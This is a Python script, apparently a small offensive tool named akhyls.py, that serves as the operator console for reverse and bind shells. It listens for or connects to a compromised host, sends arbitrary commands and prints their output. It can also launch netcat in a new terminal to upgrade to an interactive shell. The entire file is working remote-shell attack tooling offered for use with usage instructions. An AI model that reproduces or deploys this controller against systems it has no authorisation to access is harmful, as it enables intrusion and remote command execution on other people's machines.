from __future__ import print_function
import sys
import socket
import os
import time

'''
██████╗ ██████╗ ██╗   ██╗     ██╗   ██╗███████╗████████╗
██╔══██╗██╔══██╗██║   ██║     ╚██╗ ██╔╝╚══███╔╝╚══██╔══╝
██║  ██║██████╔╝██║   ██║█████╗╚████╔╝   ███╔╝    ██║   
██║  ██║██╔═══╝ ██║   ██║╚════╝ ╚██╔╝   ███╔╝     ██║   
██████╔╝██║     ╚██████╔╝        ██║   ███████╗   ██║   
╚═════╝ ╚═╝      ╚═════╝         ╚═╝   ╚══════╝   ╚═╝   

Reverse shell >> Usage ./akhyls.py -R <PORT>
Bind shell >> Usage ./akhyls.py -B <Ip> <PORT>
Author:ibrahim @via Gizem Bulut
'''
tty = """ bash -c '[[ $- == *i* ]] && echo "[+] Interactive" || echo "[+] Not interactive"' """


def reverse(port):
    try:
        reverseshell = socket.socket()
        reverseshell.bind((socket.gethostname(), int(port)))
        reverseshell.listen(1)
        print("[?] Waiting For Connection...")
        a, b = reverseshell.accept()
        print("[+] SUCCESSFUL CONNECTION")
        print(a.recv(1024).decode('utf-8'))
        print('[!] Interactive shell to check >> use command shell_check')
        print('[!] Interactive shell to switch >> use command interactive_shell')
        a.settimeout(1.5)
        host = str.encode('id -u -n')
        a.send(host)
        hostname = a.recv(1024).decode('utf-8')
        while True:
            try:
                command = input((b[0] + '@' + str(hostname.strip()) + ":"))
                if "exit" in command:
                    a.send(str.encode("exit"))
                    print('[*] SESSION CLOSED...')
                    a.close()
                    sys.exit(1)
                elif "shell_check".lower() in command:
                    print('[*] Interactıve shell checked...')
                    a.send(str.encode(tty + '\n'))
                    print(a.recv(1024).decode('utf-8'))
                elif command == "\n" or command == "":
                    print("[E] No command entered")
                    continue

                elif command == "interactive_shell":
                    print("[!] Switching to the interactive shell.Please enter the port number")
                    port2 = input("Port: ")
                    if len(port2) > 0:
                        a.send(str.encode("interactive_shell" + port2))
                        os.system("x-terminal-emulator -e nc -lvp {}".format(port2))
                        port2 = 0
                    else:
                        print("[!] Please enter the port number")
                else:
                    a.send(str.encode(command))
                    while True:
                        data_check = a.recv(8192).decode('utf-8')
                        if len(data_check) > 0:
                            print(data_check)
            except socket.timeout:
                pass
            except socket.error:
                print("[-] Disconnected")
                a.close()
                sys.exit(1)
    except KeyboardInterrupt:
        print("[-] The connection was forcibly closed")
        try:
            a.close()
        except UnboundLocalError:
            pass
        sys.exit(1)
    except ConnectionRefusedError:
        print("[-] Connection error")
    except Exception as f:
        print(f.message)


def bind(ip, port):
    try:
        print("[?] Waiting For Connection...")
        bindshell = socket.socket()
        bindshell.connect(((ip, int(port))))
        bindshell.settimeout(1.5)
        print(bindshell.recv(1024).decode('utf-8'))
        print('[!] Interactive shell to check >> use command shell_check')
        print('[!] Interactive shell to switch >> use command interactive_shell')
        host = str.encode('id -u -n')
        bindshell.send(host)
        hostname = bindshell.recv(1024).decode('utf-8')
        while True:
            try:
                command = input(ip + "@" + str(hostname.strip()) + ":")
                if "exit" in command:
                    bindshell.send(str.encode("exit"))
                    bindshell.close()
                    sys.exit(1)
                elif "shell_check".lower() in command:
                    bindshell.send(str.encode(tty + '\n'))
                    print(bindshell.recv(1024).decode('utf-8'))
                elif command == "\n" or command == "":
                    print("[E] No command entered")
                    continue
                elif "shell_check".lower() in command:
                    print('[*] Interactıve shell checked...')
                    bindshell.send(str.encode(tty + '\n'))
                    print(a.recv(1024).decode('utf-8'))

                elif command == "interactive_shell":
                    print("[!] Switching to the interactive shell.Please enter the port number")
                    port2 = input("Port: ")
                    if len(port2) > 0:
                        bindshell.send(str.encode("interactive_shell" + port2))
                        time.sleep(3)
                        os.system("x-terminal-emulator -e nc -vvn {} {}".format(ip, port2))
                        port2 = 0
                    else:
                        print("[!] Please enter the port number")
                else:
                    bindshell.send(str.encode(command))
                    while True:
                        data_check = bindshell.recv(8192).decode('utf-8')
                        if len(data_check) > 0:
                            print(data_check)
            except socket.timeout:
                pass
            except socket.error:
                print("[-] Disconnected")
                bindshell.close()
                sys.exit(1)
    except KeyboardInterrupt:
        print("[-] The connection was forcibly closed")
        try:
            bindshell.close()
        except UnboundLocalError:
            pass
        sys.exit(1)
    except ConnectionRefusedError:
        print("[-] Connection error")
    except Exception as f:
        print(f.message)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("[-] Missing Parameter")
        print('Usage ./akhyls.py -R <PORT>')
        print('Usage ./akhyls.py -B <Ip> <PORT>')
    elif ("-B" in sys.argv[1]):
        bind(sys.argv[2], sys.argv[3])
    elif ("-R" in sys.argv[1]):
        reverse(sys.argv[2])
